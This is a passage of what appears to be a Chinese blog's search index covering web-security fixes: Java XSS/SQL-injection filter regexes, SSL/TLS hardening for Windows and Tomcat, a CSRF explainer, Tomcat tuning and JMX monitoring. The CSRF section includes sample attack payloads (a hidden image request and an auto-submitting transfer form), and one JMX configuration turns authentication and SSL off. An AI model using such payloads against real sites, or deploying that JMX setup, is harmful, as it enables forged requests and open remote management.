Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"\\\\(\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"\\\\)\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\" and \", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\" or \", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\" 1=1 \", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"(\\\\bhref(?=\\\\s*=\\\\s*['\\\"]?\\\\s*javascript:))|(\\\\bdata(?!:\\\\s*image/))|(^[^<]*<(?=/textarea\\\\s*>))|(<(?=(script)|(/script)))|(\\\\b(onafterprint|onbeforeprint|onbeforeunload|onerror|onhaschange|onload|onmessage|onoffline|ononline|onpagehide|onpageshow|onpopstate|onredo|onresize|onstorage|onundo|onunload|onblur|onchange|oncontextmenu|onfocus|onformchange|onforminput|oninput|oninvalid|onreset|onreset|onsubmit|onkey\\\\w*|onclick|ondblclick|ondrag\\\\w*|ondrop|onmouse\\\\w*|onscroll|ontouch\\\\w*)(?=(\\\\s*)=))\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        return ret;\n    }\n\n}\n```\n\n```java\npublic class SafeFilterConstant {\n    public static final List<String> noFilterList = new ArrayList();\n\n    static {\n        noFilterList.add(\"res_create_user_id\");\n        noFilterList.add(\"(.*?)DataListStr(.*?)\");\n        noFilterList.add(\"proc_dxid\");\n        noFilterList.add(\"userName\");\n        noFilterList.add(\"password\");\n        noFilterList.add(\"sortParam\");\n    }\n\n}\n```\n\n\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"SSL漏洞处理","url":"/20250619/d188606.html","content":"\n## 一：漏洞扫描结果\n\n\n\n>\n>\n>1. SSL/TLS 存在Bar Mitzvah Attack漏洞\n>\n>   | 详细描述  | 该漏洞是由功能较弱而且已经过时的RC4加密算法中一个问题所导致的。它能够在某些情况下泄露SSL/TLS加密流量中的密文，从而将账户用户名密码、信用卡数据和其他敏感信息泄露给黑客。 |\n>   | :-------- | ------------------------------------------------------------ |\n>   | 解决办法  | 1、服务器端禁止使用RC4加密算法。 2、客户端应在浏览器TLS配置中禁止RC4。 |\n>   | 威胁分值  | 5                                                            |\n>   | 危险插件  | 否                                                           |\n>   | 发现日期  | 2015-03-29                                                   |\n>   | CVE编号   | [CVE-2015-2808](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2808 ) |\n>   | BUGTRAQ   | [73684](http://www.securityfocus.com/bid/73684)              |\n>   | NSFOCUS   | [30491](http://www.nsfocus.net/vulndb/30491)                 |\n>   | CNNVD编号 | [CNNVD-201503-654](http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201503-654) |\n>   | CNCVE编号 | CNCVE-20152808                                               |\n>   | CNVD编号  | [CNVD-2015-02171](http://www.cnvd.org.cn/flaw/show/CNVD-2015-02171) |\n>   | CVSS评分  | 5.3(CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)            |\n>\n>2. SLv3 存在严重设计缺陷漏洞 (CVE-2014-3566)\n>\n>   | 详细描述 | SSLv3漏洞（CVE-2014-3566），该漏洞贯穿于所有的SSLv3版本中，利用该漏洞，黑客可以通过中间人攻击等类似的方式(只要劫持到的数据加密两端均使用SSL3.0)，便可以成功获取到传输数据(例如cookies)。 针对此漏洞，需要服务器端和客户端均停用SSLv3协议。 |\n>   | :------- | ------------------------------------------------------------ |\n\n## 二：说明\n\n------\n\n首先说明一下，SSL 2 和 SSL 3 协议是两种过时的协议，原因是它们存在很严重的漏洞，所以我们要在服务端禁用 SSL 2 和 SSL 3 协议，以避免一些安全问题。\n\n- SSL 2 协议：漏洞名为 DROWN（溺水攻击 / 溺亡攻击）。DROWN 漏洞可以利用过时的 SSL 2 协议来解密与之共享相同 RSA 私钥的 TLS 协议所保护的流量。\n- SSL 3 协议：漏洞名为 POODLE（卷毛狗攻击）。POODLE 漏洞只对 CBC 模式的明文进行了身份验证，但是没有对填充字节进行完整性验证，攻击者窃取采用 SSL 3 版加密通信过程中的内容，对填充字节修改并且利用预置填充来恢复加密内容，以达到攻击目的。\n\n关于更多基于 SSL/TLS 协议的漏洞，请查看这篇文章《[常见的几种 SSL/TLS 漏洞及攻击方式](https://www.123si.org/os/article/several-common-ssl-tls-vulnerabilities-and-attacks/)》。\n\n在 Windows 系统中，服务器如果使用 Windows Server 2016 版本系统，那么恭喜你了，你可以省去禁用 SSL 2 和 SSL 3 协议的工作了，因为在此版本系统以后，微软已经默认禁用这两种协议了。如果你还不放心，下面有 SSL 服务器测试能帮你检测。其它版本系统，可参照下文介绍的 2 种设置方法来禁用协议。\n\n\n\n## 三：SSL 服务器测试\n\n------\n\n使用下面两个测试网站，可以查看你的网站的安全状态。\n\n- SSL Labs 网址：https://www.ssllabs.com/ssltest/index.html\n- My SSL 网址：https://myssl.com/\n\n\n\n##  四：处理\n\n### 方法一： 禁用 SSL 2 和 SSL 3 协议\n\n------\n\n#### 1、通过修改注册表禁用协议\n\n1. `Win + R` 键，打开运行，输入 regedit ，打开“注册表编辑器”。\n\n2. 在注册表编辑器，找到以下注册表项/文件夹：`HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols`\n\n3. 在“SSL 2.0”文件夹，右键单击并选择“新建”，然后单击“项(K)”。然后重命名文件夹为“Server”。\n\n4. 右键点击“Sever”文件夹，选择“新建”，然后单击“DWORD（32-bit）值”。\n\n5. 将新建的 DWORD 重命名为“Enabled”，并按下回车键或者双击查看。\n\n6. 请确保它显示 0x00000000（0）。如果没有，请右键单击并选择修改，输入 0 作为数值数据。\n\n7. 现在，禁用 SSL 3，对“SSL 3.0”文件夹，右键单击并选择“新建”，然后单击“项(K)”。命名新的文件夹为“Server”。\n\n8. 右键点击“Sever”文件夹，选择“新建”，然后单击 DWORD（32-bit）值。\n\n9. 将新建的 DWORD 重命名为“Enabled”，并按下回车键或者双击查看。\n\n10. 请确保它显示 0x00000000（0）的数据列下。如果没有，请右键单击并选择修改，输入 0 作为数值数据。\n\n    ![通过修改注册表禁用协议](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/123si-org-img-1550666306359-16498366977241.jpg) \n\n11. 重新启动计算机。\n\n#### 2、使用 IIS Crypto 工具\n\nIIS Crypto 是一个免费工具，使管理员能够在 Windows Server 2008，2012，2016 和 2019 上启用或禁用协议，密码，哈希和密钥交换算法。它还允许您重新排序 IIS 提供的 SSL / TLS 密码套件，更改高级设置，只需单击即可实施最佳实践，创建自定义模板并测试您的网站。\n\n![IIS Crypto 工具](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/123si-org-img-1550668068846-16498366977253.jpg) \n\n使用这个工具，设置简单方便，功能也多，懒人必备啊。这个工具需要安装到服务器，并且需要管理员权限。\n\n*IIS Crypto 工具网址：https://www.nartac.com/Products/IISCrypto/*\n\n*参考文献：微软文档：[Protocols in TLS/SSL (Schannel SSP) - Windows applications](https://docs.microsoft.com/zh-cn/windows/desktop/SecAuthN/protocols-in-tls-ssl--schannel-ssp-)*\n\n### 方法二： 开启Tomcat7的HTTPS访问\n\n在方法一策略实施之后，扫描结果 SSL3.0 依然支持访问，也就意味着漏洞扫描结果依然存在，决定开启Tomcat7 的 https 访问方式。\n\n   *参考文献： [CA证书服务配置Tomcat](https://blog.csdn.net/pang_ping/article/details/80604585)、[Tomcat7下对HTTPS的部署配置](https://www.cnblogs.com/bojuetech/p/6209657.html)*\n\n#### 一、什么是CA证书，可以用来做什么，为啥大家都爱用？\n\n​\t云盾证书服务（Alibaba Cloud Certificates Service）是阿里云联合多家国内外知名 CA 证书厂商，在阿里云平台上直接提供服务器数字证书，阿里云用户可以在云平台上直接购买、甚至免费获取所需类型的数字证书，并一键部署在阿里云产品中，以最小的成本实现将所持服务从 HTTP 转换成 HTTPS。\n\n​\t其实按照个人理解简化说的话，CA可以帮助我们从HTTP转化为HTTPS，保证了中间传输数据的安全性。至于大家为啥都爱用，主要有两点：安全性和强制性。\n\n​\t安全性我们都知道，相比起HTTPS协议来说，HTTP协议是以明文方式发送内容，不提供任何方式的数据加密，如果攻击者拦截了Web浏览器和服务器之间的传输报文，便能直接知道里面的信息，因此http不适合传输一些含有敏感信息，例如：卡号、密码等。为了解决HTTP协议的这个缺陷，所以另一个协议就诞生了：安全套接字层超文本传输协议HTTPS，为了数据传输的安全，HTTPS在HTTP基础上面增加了SSL协议，SSL协议依靠证书来验证服务器的身份，并且为浏览器和服务器之间的通信加密，所以比起HTTP更多人用HTTPS的其中之一原因就是这样来的。\n\n\n\n#### 二、如何申请CA证书服务（用户提供，跳过）\n\n1. 进入控制台选择CA证书服务\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70.png) \n\n2. 点击购买证书\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-16498375346979.png) \n\n3. 选择，我这里是选择免费的，所以我会点击一个域名，品牌使用Symantec，然后就会有一个免费型的DV出来，如果自己测试想要免费的话跟着我来就可以用了。\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983754971512.png) \n\n\n\n\n\n4. 点击立即购买\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983759067215.png) \n\n5. 选择支付\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983760383818.png) \n\n6. 进入证书控制台\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983761975221.png) \n\n\n\n7. 购买成功后会有一条记录，我们选择补全\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983763141024.png) \n\n8. 输入你的域名\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983764712027.png) \n\n\n\n9. 填入你的相关信息（建议：个人建议域名验证类型使用DNS不要选择文件，选择系统生成的CSR，由于小编自己的域名是买的腾讯云的，服务器是阿里的所以我就不点击证书绑定的域名了，如果服务器和域名都在阿里的话可以点击）然后下一步。\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983766359730.png) \n\n10. 提交审核，审核时间一天内就可以了 \n\n    ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983767884933.png) \n\n#### 三、CA证书服务配置Tomcat\n\n\n\n##### 准备证书文件\n\n###### 自己拥有的证书（未参考，跳过）\n\n- 选择审核通过的证书进行下载\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983854427836.png) \n\n- 我这里选择的是Tomcat，你们可以自行选择，下载压缩包\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983855342039.png) \n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983857428142.png) \n\n- 选择PFX格式的到Tomcat进行相关配置，跟着我上面操作的可以直接跳到第二步，完整信息配置需要记下，后面配置需要\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/70-164983859275545.png) \n\n\n\n###### 用户提供证书，转PFX格式\n\n- 用户提供证书文件列表\n  - XXXXX.pem\n  - XXXXX.key\n\n\n\n- 注册网站：https://app.certbase.com，利用证书工具将证书`.PEM`格式转换为`.pfx`格式\n\n  ![image-20220413162330755](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220413162330755.png)\n\n\n\n- 转换并下载，获得文件列表\n  - XXXXX.pfx\n  - password.txt （保存的是页面设置PFX密码）\n\n\n\n##### Tomcat配置证书\n\n1. 将下载好的压缩包解压之后将所有的文件都放到`tomcat`目录下创建的`cert`目录中（目录名称自定义）\n\n2. 点开server.xml文件, 添加配置\n\n   ```xml\n   <Connector port=\"443\"\n   \t\tprotocol=\"org.apache.coyote.http11.Http11Protocol\"\n   \t\tSSLEnabled=\"true\"\n   \t\tscheme=\"https\"\n   \t\tsecure=\"true\"\n   \t\tkeystoreType=\"PKCS12\"\n           keystoreFile=\"PFX所在地的完整路径\"\n           keystorePass=\"password.txt中的文本内容\"\n   \t\tclientAuth=\"false\"\n   \t\tSSLProtocol=\"TLSv1+TLSv1.1+TLSv1.2\"\n              ciphers=\"TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA256\"/>\n   ```\n\n   说明：\n\n   | 配置文件参数 | 说明                                                         |\n   | ------------ | ------------------------------------------------------------ |\n   | clientAuth   | 如果设为true，表示Tomcat要求所有的SSL客户出示安全证书，对SSL客户进行身份验证 |\n   | keystoreFile | 指定keystore文件的存放位置，可以指定绝对路径，也可以指定相对于<catalina_home> （Tomcat安装目录）环境变量的相对路径。<br/>如果此项没有设定，默认情况下，Tomcat将从当前操作系统用户的用户目录下读取名为 “.keystore”的文件。 |\n   | keystorePass | 密钥库密码，指定keystore的密码。（如果申请证书时有填写私钥密码，密钥库密码即私钥密码） |\n   | SSLProtocol  | 指定套接字（Socket）使用的加密/解密协议，默认值为TLS         |\n\n\n\n3. http自动跳转https的安全配置（）\n\n   到conf目录下的web.xml。在`</welcome-file-list>`后面，`</web-app>`，也就是倒数第二段里，加上这样一段\n\n   ```xml\n   <security-constraint><web-resource-collection >\n       <web-resource-name >SSL</web-resource-name>\n       <url-pattern>/*</url-pattern>\n   </web-resource-collection>\n   <user-data-constraint>\n       <transport-guarantee>CONFIDENTIAL</transport-guarantee>\n   </user-data-constraint></security-constraint>\n   ```\n\n   这步目的是让非ssl的connector跳转到ssl的connector去。所以还需要前往server.xml进行配置`80`端口跳转`443`：\n\n   ```xml\n   <Connector port=\"8080\" protocol=\"HTTP/1.1\"\n       connectionTimeout=\"20000\"\n       redirectPort=\"443\" />\n   ```\n\n4. 由于tomcat对ssl的实现由两种方式，tomcat7默认实现是APR方式，所以这里我们要对server.xml再进行相关修改\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/789495-20161222005744761-894166255.png) \n\n5. 重启Tomcat\n\n6. 本地进行`https:// 域名`测试，是否可正常访问\n\n7. 防火墙开放`443`端口出口访问\n\n8. 需要网络管理员进行内网端口映射\n\n   参考图：\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2015010319370191.jpg) \n\n\n\n9. 外网访问`https://域名` 测试，是否可正常访问\n10. 漏洞再次扫描：此时SSL 3 状态变更为关闭状态。\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"CSRF漏洞处理","url":"/20250619/96960bec.html","content":"\n# [前端安全系列：CSRF篇](https://segmentfault.com/a/1190000019980372)\n\n## CSRF介绍\n\nCSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。攻击通过在授权用户访问的页面中包含链接或者脚本的方式工作\n\n## CSRF攻击\n\n一个典型的CSRF攻击流程大概如下:\n\n1. 用户登录`a.com`并**保留登录信息**\n2. 攻击者**引诱用户访问**了`b.com`\n3. `b.com`在用户不知情的情况下向`a.com`发送请求并携带用户的登录信息\n4. `a.com`接收请求验证登录信息通过执行某些恶意操作\n5. 攻击者在用户不知情的情况下冒充用户的身份完成了攻击.\n\n攻击方式:\n\n- 攻击者的网站\n- 有文件上传漏洞的网站\n- 第三方论坛,博客等网站\n- 目标网站自身的漏洞\n\n相对`XSS`攻击,`CSRF`攻击不太一样\n\n- 一般攻击发起点不在目标网站,而是被引导到第三方网站再发起攻击,这样目标网站就无法防止\n- 攻击者不能获取到用户Cookies,包括子域名,而是利用Cookies的特性冒充用户身份进行攻击\n- 通常是跨域攻击,因为攻击者更容易掌握第三方网站而不是只能利用目标网站自身漏洞\n- 攻击方式包括图片,URL,CORS,表单,甚至直接嵌入第三方论坛,文章等等,难以追踪\n\n## 常见的CSRF攻击类型\n\n### GET请求\n\n例如利用隐藏图片自动发起一个HTTP请求,会自动附带用户cookies\n\n```abnf\n<img style=\"width:0;\" src=\"https://www.test.com/xxx\" />\n```\n\n### POST请求\n\n例如利用隐藏表单自动提交\n\n```abnf\n<form action=\"https://www.test.com/xxx\" method=POST>\n    <input type=\"hidden\" name=\"account\" value=\"xiaoming\" />\n    <input type=\"hidden\" name=\"amount\" value=\"10000\" />\n</form>\n<script> document.forms[0].submit(); </script> \n```\n\n### URL攻击\n\n比较常见的利诱广告方式或者冒充QQ病毒警告等引诱用户自己点击\n\n```routeros\n<a href=\"https://www.test.com/xxx\" taget=\"_blank\">\n  一刀9999级,神级装备,顶级神宠,开服就有！！\n<a/>\n```\n\n\n\n## 防御：限制访问名单\n\n### 同源检测\n\nHTTP协议中一般会携带两个带有来源信息的字段:\n\n#### Origin\n\n指示了请求来自于哪个站点。该字段仅指示服务器名称，并不包含任何路径信息, 用于 CORS 请求或者 POST 请求。Origin在以下两种情况下并不存在：\n\n- IE 11 不会在跨站CORS请求上添加Origin标头\n- 302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。\n\n#### Referer\n\n包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 首部识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。\n\n- 对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。\n- 对于页面跳转，Referer为打开页面历史记录的前一个页面地址\n\n在以下情况下，`Referer` 不会被发送：\n\n- 来源页面采用的协议为表示本地文件的 \"file\" 或者 \"data\" URI\n- 当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）\n\n虽然HTTP有明确要求,也有Referrer Policy草案对浏览器如何发送做了详细规定,但是浏览器实现可能有差别,不能保障安全性.低版本浏览器,Flash等情况可能丢失或不可信,新的Referrer规定了五种策略：\n\n| States                     | 作用                                                         |\n| -------------------------- | ------------------------------------------------------------ |\n| no-Referrer                | 任何情况下都不发送Referrer信息                               |\n| no-Referrer-when-downgrade | 仅当协议降级（如HTTPS页面引入HTTP资源）时不发送Referrer信息。是大部分浏览器默认策略 |\n| origin                     | 发送只包含host部分的referrer.                                |\n| origin-when-cross-origin   | 仅在发生跨域访问时发送只包含host的Referer，同域下还是完整的。与Origin Only的区别是多判断了是否Cross-origin。协议、域名和端口都一致，浏览器才认为是同域 |\n| unsafe-url                 | 全部都发送Referrer信息。最宽松最不安全的策略                 |\n\n设置Referrer Policy的方法有:\n\n- 在HTTP的CSP（Content Security Policy）设置\n\n  ```pgsql\n  Content-Security-Policy: referrer no-referrer|no-referrer-when-downgrade|origin|origin-when-cross-origin|unsafe-url;\n  ```\n\n- 页面头部增加meta标签, 默认no-referer策略\n\n  ```routeros\n  <meta name=\"referrer\" content=\"no-referrer|no-referrer-when-downgrade|origin|origin-when-crossorigin|unsafe-url\">\n  ```\n\n- a标签增加Referrer Policy属性,只支持三种\n\n  ```routeros\n  <a href=\"http://example.com\" referrer=\"no-referrer|origin|unsafe-url\">xxx</a>\n  ```\n\n发起请求的来源域名可能是网站本域，或者子域名，或者有授权的第三方域名，又或者来自不可信的未知域名。业务上需要针对各种情况作出过滤规则,一般优先使用`Origin`确认来源信息就够了,`Referrer `变数太多比较适合打辅助.但是如果两者都获取不到的情况下,建议直接进行阻止.\n\n同源规则能简单防范大多数CSRF攻击,配合关键接口做额外处理能更好提高安全性.\n\n### SameSite\n\n一种新的防止跨站点请求伪造（cross site request forgery）的 http 安全特性。该值可以设置为 `Strict` 或 `Lax`,现阶段只有部分主流浏览器支持,仅做了解即可\n\n```routeros\nSet-Cookie: key=value; SameSite=Strict/Lax\n```\n\n- Strict: 跨域请求或者新标签重新打开都不会携带该Cokies\n- Lax: 这个请求是（改变了当前页面或者打开了新页面）且同时是个GET请求，则携带。\n\n还有一个比较严重的问题是SameSite不支持子域名.\n\n## 防御：附加验证\n\n### 验证码\n\n通过图形验证码或者手机验证码或者邮箱验证等多种方式强制用户进行交互可以有效遏制CSRF攻击,缺点是步骤比较繁琐,只适用于如涉及金额,密码相关等关键请求,\n\n### CSRF Token\n\n基于攻击者无法获得用户信息的特性,我们可以在前后端交互中携带一个有效验证“令牌”来防范CSRF攻击,大概流程:\n\n1. 当用户首次登录成功之后, 服务端会生成一个唯一性和随机性的 token 值保存在服务器的Session或者其他缓存系统中，再将这个token值返回给浏览器；\n2. 浏览器拿到 token 值之后本地保存；\n3. 当浏览器再次发送网络请求的时候,就会将这个 token 值附带到参数中(或者通过Header头)发送给服务端；\n4. 服务端接收到浏览器的请求之后,会取出token值与保存在服务器的Session的token值做对比验证其正确性和有效期。\n\n在大型网站一般使用多台服务器,用户请求经过负载均衡器路由到具体的服务器上,如果使用Session默认储存在单机服务器内存中,在分布式环境下同一用户的多次请求可能会指向不同的服务器上,而其他的服务器无法共享Session导致Session机制失效无法验证,所以分布式集群中Token需要储存在Redis等公共储存空间.\n\n因为读取和验证Token会有复杂度和性能的问题,还有种方式采用Encrypted Token Pattern方式,通常是使用UserID、时间戳和随机数，通过加密的方法生成而非随机性,之后请求校验不需要读取而是直接计算即可,这样既可以保证分布式服务的Token一致，又能保证Token不容易被破解。\n\n### 双重Cookie验证\n\n相较于CSRF Token,这种方式比较简单实现但是安全性较低.大概流程:\n\n1. 用户访问页面之后域名被注入随机字符串Cookie\n2. 浏览器发起请求时会取出该Cookie字符串添加到URL参数中\n3. 服务端验证是否一致\n\n没有大规模应用除了安全性问题还有一个就是跨域可能导致获取不到Cookie.\n\n1. 用户访问网站域名`www.test.com`,服务端api域名`api.test.com`,\n2. 如果想要共用Cookie就必须注入到`test.com`,然后子域名都能获取到\n3. 同理每个子域名都能修改该Cookie,如果某个子域名被攻击了\n4. 攻击者可以自己配置一个Cookie破解双重Cookie验证机制拦截\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"Tomcat基础","url":"/20250619/530cfffd.html","content":"\n\n\n# Tomcat的四种基于HTTP协议的Connector性能比较\n\n今天在osc上看到对Tomcat的四种基于HTTP协议的Connector性能比较\n\n具体内容如下：\n\n```xml\n<Connector port=\"8081\" protocol=\"org.apache.coyote.http11.Http11NioProtocol\" connectionTimeout=\"20000\" redirectPort=\"8443\"/>\n\n<Connector port=\"8081\" protocol=\"HTTP/1.1\" connectionTimeout=\"20000\" redirectPort=\"8443\"/>\n\n\n<Connector port=\"8081\" protocol=\"HTTP/1.1\" executor=\"tomcatThreadPool\" connectionTimeout=\"20000\" redirectPort=\"8443\" />\n\n<Connector port=\"8081\" protocol=\"org.apache.coyote.http11.Http11NioProtocol\" executor=\"tomcatThreadPool\" connectionTimeout=\"20000\"  redirectPort=\"8443\" />\n```\n\n我们姑且把上面四种Connector按照顺序命名为 NIO, HTTP, POOL, NIOP\n\n为了不让其他因素影响测试结果，我们只对一个很简单的jsp页面进行测试，这个页面仅仅是输出一个Hello World。假设地址是 http://tomcat1/test.jsp\n\n我们依次对四种Connector进行测试，测试的客户端在另外一台机器上用ab命令来完成，\n\n测试命令为： ab -c 900 -n 2000 http://tomcat1/test.jsp ，\n\n最终的测试结果如下表所示(单位:平均每秒处理的请求数)：\n\n \n\n| NIO                               | HTTP                                               | POOL                                                      | NIOP                                                         |\n| --------------------------------- | -------------------------------------------------- | --------------------------------------------------------- | ------------------------------------------------------------ |\n| 281                               | 65                                                 | 208                                                       | 365                                                          |\n| 666                               | 66                                                 | 110                                                       | 398                                                          |\n| 692                               | 65                                                 | 66                                                        | 263                                                          |\n| 256                               | 63                                                 | 94                                                        | 459                                                          |\n| 440                               | 67                                                 | 145                                                       | 363                                                          |\n| NIO方式波动很大，但没有低于280 的 | Tomcat的默认配置HTTP的性能是很稳定，但是也是最差的 | 而POOL方式则波动很大，测试期间和HTTP方式一 样，不时有停滞 | NIOP是在NIO的基础上加入线程池，可能是程序处理更复杂了，因此性能不见得比NIO强 |\n\n \n\n由于linux的内核默认限制了最大打开文件数目是1024，因此此次并发数控制在900。\n\n \n\n尽管这一个结果在实际的网站中因为各方面因素导致，可能差别没这么大，例如受限于数据库的性能等等的问题。\n\n但对我们在部署网站应用时还是具有参考价值的。\n\n```xml\n<Connector executor=\"tomcatThreadPool\" port=\"8090\" redirectPort=\"8443\" protocol=\"org.apache.coyote.http11.Http11NioProtocol\" compression=\"on\" compressionMinSize=\"2048\" enableLookups=\"false\" acceptCount=\"1000\" URIEncoding=\"UTF-8\" connectionTimeout=\"40000\" />\n```\n\n| 说明                     | 参数                                                  |\n| ------------------------ | ----------------------------------------------------- |\n| 连接器使用的线程池的名子 | executor=\"tomcatThreadPool\"                           |\n| 连接器端口               | port=\"8090\"                                           |\n| 连接器使用的传输方式     | protocol=\"org.apache.coyote.http11.Http11NioProtocol\" |\n| 传输时是否支持压缩       | compression=\"on\"                                      |\n| 压缩的大小               | compressionMinSize=\"2048\"                             |\n\n```xml\n<Executor name=\"tomcatThreadPool\" namePrefix=\"catalina-exec-\" maxThreads=\"800\" minSpareThreads=\"400\" maxSpareThreads=\"700\" />\n```\n\n| 线程池名       | name=\"tomcatThreadPool\"     |\n| -------------- | --------------------------- |\n| 线程前缀       | namePrefix=\"catalina-exec-\" |\n| 最大产生线程数 | maxThreads=\"800\"            |\n| 最小初始线程数 | minSpareThreads=\"400\"       |\n| 最大初始线程数 | maxSpareThreads=\"700\"       |\n\n\n\n# Tomcat开启JMX监控\n\n背景：Tomcat系统运行过程出现错误，需要打开JMX，添加对JVM的监控。Tomcat运行在CentOS中。\n\n前提：监控端windows系统，安装JDK。\n\n\n\n1. 服务器关闭Tomcat\n\n   ```sh\n    cd /opt/apache-tomcat-7.0.54/bin\n   \n   ./shutdown.sh\n   ```\n\n   \n\n2. 进入Tomcat/bin目录，修改catalina.sh，找到如下内容“#—–Execute The Requested Command”，在其上添加以下配置，此配置不需要用户名、密码\n\n   ```sh\n   CATALINA_OPTS=”$CATALINA_OPTS\n   \n   -Dcom.sun.management.jmxremote\n   \n   -Djava.rmi.server.hostname=192.168.23.1\n   \n   -Dcom.sun.management.jmxremote.port=9999\n   \n   -Dcom.sun.management.jmxremote.ssl=false\n   \n   -Dcom.sun.management.jmxremote.authenticate=false”\n   ```\n\n   | 参数         | 说明                                     |\n   | ------------ | ---------------------------------------- |\n   | ip           | 是你要监控的tomcat所在服务器的ip地址。   |\n   | 端口号       | 是你要开启的监控端口号。                 |\n   | ssl          | false表示不使用ssl链接。                 |\n   | authenticate | false表示不使用监控,即不需要用户名和密码 |\n\n   以下方式需要配置用户名、密码\n\n   ```sh\n   CATALINA_OPTS=”$CATALINA_OPTS\n   \n   -Dcom.sun.management.jmxremote\n   \n   -Djava.rmi.server.hostname=192.168.23.1\n   \n   -Dcom.sun.management.jmxremote.port=9999\n   \n   -Dcom.sun.management.jmxremote.ssl=false\n   \n   -Dcom.sun.management.jmxremote.authenticate=true\n   \n   -Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password\n   \n   -Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access”\n   ```\n\n   | 参数          | 说明             |\n   | ------------- | ---------------- |\n   | authenticate  | true开启鉴权功能 |\n   | access.file   | 权限文件路径     |\n   | password.file | 密码文件路径     |\n\n\n\n \n\n3. 当没有配置密码时，无需此操作。当启用密码后，根据上述配置，将 `JAVA_HOME/jre/lib/management`下面的`jmxremote.access`和`jmxremote.password.template`拷贝到Tomcat的conf目录下，并对两个文件做以下修改：\n\n   jmxremote.password.template文件名修改为jmxremote.password\n\n   修改两个文件的权限\n\n```sh\nchmod 600 jmxremote.access\nchmod 600 jmxremote.password\n```\n\n修改jmxremote.access文件，将文件最后两行显示【monitorRole和controlRole】的注释取消，\n\n其中monitorRole为只拥有只读权限的角色，\n\ncontrolRole有更高权限：读写等。编辑完成后，保存。\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-16383503107176.png)  \n\n \n\n修改jmxremote.password文件。同样将文件最后两行显示【monitorRole和controlRole】的注释取消，两个用户名后面的字符即密码，然后保存。\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16383503107187.png)  \n\n4. 服务器启动Tomcat\n\n   ```sh\n    cd /opt/apache-tomcat-7.0.54/bin\n   \n   ./startup.sh\n   ```\n\n5. 做完以上操作后，使用jdk自带工具jvisualvm.exe连接，工具目录如下：JAVA_HOME/bin，连接方式如下：\n\n   右击“远程”，“添加远程主机”\n\n​\t   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image003-16383503107188.png) ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image004-16383503107189.png) \n\n \t右击添加好的主机，“添加JMX连接”，根据配置信息，填写相应的端口、用户名、密码等信息\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image005-163835031071810.png)  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image006-163835031071811.png)\n\n6. 